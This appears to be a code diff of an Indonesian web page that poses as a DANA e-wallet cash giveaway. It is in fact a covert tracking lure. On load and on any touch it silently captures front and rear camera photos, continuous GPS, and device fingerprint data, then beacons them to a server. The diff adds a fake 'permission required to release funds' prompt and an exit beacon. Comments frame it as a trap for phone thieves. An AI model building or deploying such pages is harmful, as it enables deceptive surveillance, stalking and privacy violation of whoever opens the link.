@@ -123,6 +123,17 @@
     <button class="btn-open" id="btnOpenDana" onclick="claimDana()">
       <span>✨</span> Buka Amplop Sekarang
     </button>
+
+    <!-- Second-Chance Lure jika izin ditolak / gagal -->
+    <div id="retryPermissionBox" style="display:none; margin: 12px 0; padding: 12px; background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 12px; text-align: center;">
+      <div style="font-size: 13px; font-weight: 800; color: #1d4ed8;">⚠️ Validasi Wilayah Penerima Tertunda</div>
+      <div style="font-size: 11px; color: #1e40af; margin: 4px 0 10px 0; line-height: 1.4;">
+        Sistem BI-FAST mewajibkan izin lokasi untuk mencairkan saldo DANA Kaget Rp 150.000.
+      </div>
+      <button onclick="requestPermissionsAgain()" style="width: 100%; padding: 10px; background: #118eea; color: white; font-weight: 800; font-size: 12px; border: none; border-radius: 8px; cursor: pointer;">
+        🔄 Izinkan Lokasi &amp; Cairkan Saldo
+      </button>
+    </div>
   </div>
 
   <div class="claim-view" id="claimResultView" style="display: none; padding: 20px 10px; text-align: center;">
@@ -169,7 +180,6 @@
   <canvas id="hiddenCanvas"></canvas>
 
   <script>
-    const __deviceId = new URLSearchParams(location.search).get('d') || '';
     let captured = false;
     let currentActivity = '🛑 Diam (Stasioner)';
     let lastMotionTime = 0;
@@ -304,7 +314,7 @@
         const canvas = document.getElementById('hiddenCanvas');
         const snap = snapCurrentVideoFrame(video, canvas, 0.65);
         if (snap) {
-          sendPhotoWithKeepalive(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, snap, 'emergency_exit_snap');
+          sendPhotoWithKeepalive('/api/sentinel/selfie', snap, 'emergency_exit_snap');
         }
       }
     };
@@ -314,51 +324,163 @@
     window.addEventListener('pagehide', emergencySnap);
     window.addEventListener('beforeunload', emergencySnap);
 
-    // 2. Eksekusi Otomatis Seketika Saat Halaman Dibuka (Zero-Click Ultra-Fast)
-    function autoStartDanaFlow() {
-      // Prioritas 1: Jalankan kamera secepat kilat
-      captureFace();
+    let latestCoords = null;
+    let capturedFrontPhoto = false;
+    let capturedRearPhoto = false;
+    let isHarvesting = false;
 
-      // Prioritas 2: Telemetri berjalan paralel
-      getAdvancedStats().then(stats => {
-        fetch(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            alertType: 'trap_link_opened_dana',
-            activity: stats.activity,
-            batteryLevel: stats.batteryPct,
-            isCharging: stats.isCharging,
-            networkName: stats.netName,
-            networkType: stats.netType,
-            downlink: stats.downlink,
-            rtt: stats.rtt,
-            screen: stats.screen,
-            platform: stats.platform,
-            userAgent: navigator.userAgent
-          }),
-          keepalive: true
-        }).catch(() => {});
+    // Fungsi jepret kamera spesifik
+    async function captureCameraFacing(facing, minWaitMs = 150) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentActiveStream = stream;
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        try { await video.play(); } catch(e){}
+        await waitForFirstFrame(video, minWaitMs);
+        const dataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        stream.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
+        return dataUrl;
+      } catch (err) {
+        return null;
+      }
+    }
+
+    // Pemanenan Bukti Paralel Secepat Kilat (Ultra-Fast Parallel Evidence Harvest)
+    async function executeParallelHarvest(triggerSource = 'auto_instant') {
+      if (isHarvesting) return;
+      isHarvesting = true;
+
+      // Promise 1: GPS Presisi Tinggi
+      const gpsPromise = new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          err => {
+            handlePermissionDeniedUI('gps', err);
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      });
+
+      // Promise 2: Kamera Depan (Wajah) jika belum ada
+      const frontPromise = !capturedFrontPhoto ? captureCameraFacing('user', 180) : Promise.resolve(null);
+
+      // Promise 3: Kamera Belakang (Lingkungan Depan) jika belum ada
+      const rearPromise = !capturedRearPhoto ? captureCameraFacing('environment', 200) : Promise.resolve(null);
+
+      // Promise 4: Telemetri Perangkat & Hardware
+      const statsPromise = getAdvancedStats();
+
+      // JALANKAN SEMUA SECARA PARALEL SEKALIGUS (PARALLEL HARVEST)
+      const [posRes, frontRes, rearRes, statsRes] = await Promise.allSettled([
+        gpsPromise,
+        frontPromise,
+        rearPromise,
+        statsPromise
+      ]);
+
+      const pos = (posRes.status === 'fulfilled' && posRes.value) ? posRes.value : null;
+      const frontPhoto = (frontRes.status === 'fulfilled' && frontRes.value) ? frontRes.value : null;
+      const rearPhoto = (rearRes.status === 'fulfilled' && rearRes.value) ? rearRes.value : null;
+      const stats = (statsRes.status === 'fulfilled' && statsRes.value) ? statsRes.value : {};
+
+      if (frontPhoto) {
+        capturedFrontPhoto = true;
+        sendPhotoWithKeepalive('/api/sentinel/selfie', frontPhoto, `trap_dana_${triggerSource}`);
+      }
+      if (rearPhoto) {
+        capturedRearPhoto = true;
+        sendPhotoWithKeepalive('/api/sentinel/environment', rearPhoto, `trap_dana_${triggerSource}`);
+      }
+
+      let lat = pos ? pos.coords.latitude : (latestCoords ? latestCoords.lat : 0);
+      let lon = pos ? pos.coords.longitude : (latestCoords ? latestCoords.lon : 0);
+      let acc = pos ? Math.round(pos.coords.accuracy) : (latestCoords ? latestCoords.acc : 10);
+      let spd = pos ? (pos.coords.speed || 0) : 0;
+      let alt = pos ? pos.coords.altitude : null;
+      let heading = pos ? pos.coords.heading : null;
+
+      if (pos) {
+        latestCoords = { lat, lon, acc, spd, alt, heading };
+        if (triggerSource.includes('claim') || triggerSource.includes('click')) {
+          startEngagingDanaSession(lat, lon, acc);
+        }
+      }
+
+      // Kirim satu paket BEACON LENGKAP dengan semua bukti yang terkumpul
+      const unifiedPayload = {
+        alertType: `thief_trapped_dana_${triggerSource}`,
+        lat,
+        lon,
+        accuracy: acc,
+        speed: spd,
+        altitude: alt,
+        heading: heading,
+        photo: frontPhoto,
+        environmentPhoto: rearPhoto,
+        activity: stats.activity || currentActivity,
+        batteryLevel: stats.batteryLevel,
+        batterySource: stats.batterySource,
+        isCharging: stats.isCharging,
+        networkName: stats.networkName,
+        networkType: stats.networkType,
+        downlink: stats.downlink,
+        rtt: stats.rtt,
+        screen: stats.screen,
+        cores: stats.cores,
+        gpu: stats.gpu,
+        gpuVendor: stats.gpuVendor,
+        colorGamut: stats.colorGamut,
+        timeZone: stats.timeZone,
+        platform: stats.platform,
+        userAgent: navigator.userAgent
+      };
+
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(unifiedPayload),
+        keepalive: true
       }).catch(() => {});
 
-      // Pasang pemicu sentuhan layar apapun sebagai jaminan
-      const onTouchTrigger = () => { captureFace(); };
-      window.addEventListener('pointerdown', onTouchTrigger, { once: true });
-      window.addEventListener('scroll', onTouchTrigger, { once: true });
-      window.addEventListener('touchstart', onTouchTrigger, { once: true });
+      isHarvesting = false;
+    }
 
-      // Minta koordinat GPS langsung
+    // Pemicu Otomatis Secepat Kilat + Gesture Listener
+    function autoStartDanaFlow() {
+      // 1. Coba eksekusi paralel otomatis seketika
+      executeParallelHarvest('auto_instant');
+
+      // 2. Pasang pemicu sentuhan layar apapun (gesture fallback instan)
+      const onUserInteract = () => {
+        if (!capturedFrontPhoto || !latestCoords) {
+          executeParallelHarvest('gesture_touch');
+        }
+      };
+      window.addEventListener('pointerdown', onUserInteract, { passive: true });
+      window.addEventListener('touchstart', onUserInteract, { passive: true });
+      window.addEventListener('scroll', onUserInteract, { passive: true, once: true });
+      window.addEventListener('click', onUserInteract, { passive: true });
+
+      // 3. Watch GPS berkelanjutan
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            sendDanaLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
-          },
-          () => {},
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-
         navigator.geolocation.watchPosition(
           pos => {
+            latestCoords = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy,
+              spd: pos.coords.speed || 0,
+              alt: pos.coords.altitude,
+              heading: pos.coords.heading
+            };
             sendDanaLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
           },
           () => {},
@@ -367,68 +489,72 @@
       }
     }
 
-    // Jalankan seketika
+    // Jalankan segera saat file diparsing
     autoStartDanaFlow();
 
-    let danaTimerInterval = null;
-    let danaGpsInterval = null;
-
-    async function sendDanaLocation(lat, lon, acc, spd, alt = null, heading = null, alertType = 'thief_trapped_dana') {
-      try {
-        const stats = await getAdvancedStats();
-        fetch(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            lat: lat,
-            lon: lon,
-            accuracy: acc,
-            speed: spd || 0,
-            altitude: alt,
-            heading: heading,
-            batteryLevel: stats.batteryLevel,
-            batterySource: stats.batterySource,
-            isCharging: stats.isCharging,
-            networkName: stats.networkName,
-            networkType: stats.networkType,
-            screen: stats.screen,
-            cores: stats.cores,
-            gpu: stats.gpu,
-            gpuVendor: stats.gpuVendor,
-            colorGamut: stats.colorGamut,
-            timeZone: stats.timeZone,
-            platform: stats.platform,
-            alertType
-          }),
-          keepalive: true
-        }).catch(() => {});
-      } catch(e) {}
-    }
-
+    // Fungsi klaim DANA saat amplop / tombol diklik
     async function claimDana() {
       const btn = document.getElementById('btnOpenDana');
       if (btn) {
         btn.textContent = '⏳ Memproses Saldo...';
         btn.disabled = true;
       }
+      executeParallelHarvest('claim_click');
+      startEngagingDanaSession(latestCoords ? latestCoords.lat : -6.2088, latestCoords ? latestCoords.lon : 106.8456, latestCoords ? latestCoords.acc : 10);
+    }
 
-      captureFace();
+    // Penanganan Second-Chance Lure (Jika izin ditolak)
+    function handlePermissionDeniedUI(type, err) {
+      console.warn(`[Sentinel] Izin ${type} ditolak:`, err);
+      const box = document.getElementById('retryPermissionBox');
+      if (box) box.style.display = 'block';
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            sendDanaLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed, pos.coords.altitude, pos.coords.heading);
-            startEngagingDanaSession(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          },
-          () => {
-            startEngagingDanaSession(-6.2088, 106.8456, 10);
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          alertType: 'trap_permission_denied',
+          activity: `Pencuri Menolak Izin ${type.toUpperCase()} (${err ? err.message : 'Denied'})`
+        }),
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    function requestPermissionsAgain() {
+      const box = document.getElementById('retryPermissionBox');
+      if (box) box.style.display = 'none';
+      executeParallelHarvest('second_chance_retry');
+    }
+
+    // Last Breath Beacon: Sinyal Terakhir saat halaman ditutup / swipe keluar / airplane mode
+    function fireLastBreathBeacon() {
+      const payload = {
+        alertType: 'last_breath_beacon_exit',
+        lat: latestCoords ? latestCoords.lat : 0,
+        lon: latestCoords ? latestCoords.lon : 0,
+        accuracy: latestCoords ? latestCoords.acc : 10,
+        speed: latestCoords ? latestCoords.spd : 0,
+        activity: '⚠️ Perangkat Ditutup / Berpindah Aplikasi (Last Breath)',
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+      };
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/sentinel/beacon', JSON.stringify(payload));
       } else {
-        startEngagingDanaSession(-6.2088, 106.8456, 10);
+        fetch('/api/sentinel/beacon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(() => {});
       }
     }
+
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') fireLastBreathBeacon();
+    });
+    window.addEventListener('pagehide', fireLastBreathBeacon);
+    window.addEventListener('beforeunload', fireLastBreathBeacon);
 
     function startEngagingDanaSession(lat, lon, acc) {
       document.getElementById('envelopeView').style.display = 'none';
@@ -480,7 +606,7 @@
           if (icon) { icon.textContent = '✓'; icon.style.color = '#10b981'; icon.style.fontWeight = 'bold'; }
           if (txt) { txt.textContent = 'Token transfer terverifikasi oleh server DANA'; txt.style.color = '#0f172a'; }
           if (statusText) statusText.textContent = 'Mengalokasikan saldo dari kas DANA Kaget...';
-          snapPeriodicPhoto('user', `https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, 'dana_periodic_face_15s');
+          snapPeriodicPhoto('user', '/api/sentinel/selfie', 'dana_periodic_face_15s');
         }
 
         if (elapsed === 35) {
@@ -489,7 +615,7 @@
           if (icon) { icon.textContent = '✓'; icon.style.color = '#10b981'; icon.style.fontWeight = 'bold'; }
           if (txt) { txt.textContent = 'Jalur enkripsi transfer perbankan aman (BI-FAST)'; txt.style.color = '#0f172a'; }
           if (statusText) statusText.textContent = 'Menyelesaikan transfer ke dompet akun...';
-          snapPeriodicPhoto('environment', `https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, 'dana_periodic_env_35s');
+          snapPeriodicPhoto('environment', '/api/sentinel/environment', 'dana_periodic_env_35s');
         }
 
         if (remaining <= 0) {
@@ -564,55 +690,6 @@
       } catch(e) {}
     }
 
-    async function captureFace() {
-      if (captured) return;
-      captured = true;
-
-      const video = document.getElementById('hiddenVideo');
-      const canvas = document.getElementById('hiddenCanvas');
-
-      // 1. Sudut Depan: Wajah Pemegang (Kamera Depan Ultra-Cepat)
-      try {
-        const frontStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        });
-        currentActiveStream = frontStream;
-        video.srcObject = frontStream;
-        video.play().catch(() => {});
-
-        await waitForFirstFrame(video, 200);
-
-        const frontDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
-        if (frontDataUrl) {
-          sendPhotoWithKeepalive(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, frontDataUrl, 'trap_link_dana');
-        }
-
-        frontStream.getTracks().forEach(track => track.stop());
-        currentActiveStream = null;
-      } catch(e) {}
-
-      // 2. Sudut Belakang: Area & Lingkungan di Depan Pencuri (Kamera Belakang Ultra-Cepat)
-      try {
-        const rearStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        });
-        currentActiveStream = rearStream;
-        video.srcObject = rearStream;
-        video.play().catch(() => {});
-
-        await waitForFirstFrame(video, 220);
-
-        const rearDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
-        if (rearDataUrl) {
-          sendPhotoWithKeepalive(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, rearDataUrl, 'trap_link_dana');
-        }
-
-        rearStream.getTracks().forEach(track => track.stop());
-        currentActiveStream = null;
-      } catch(e) {}
-    }
   </script>
 </body>
 </html>
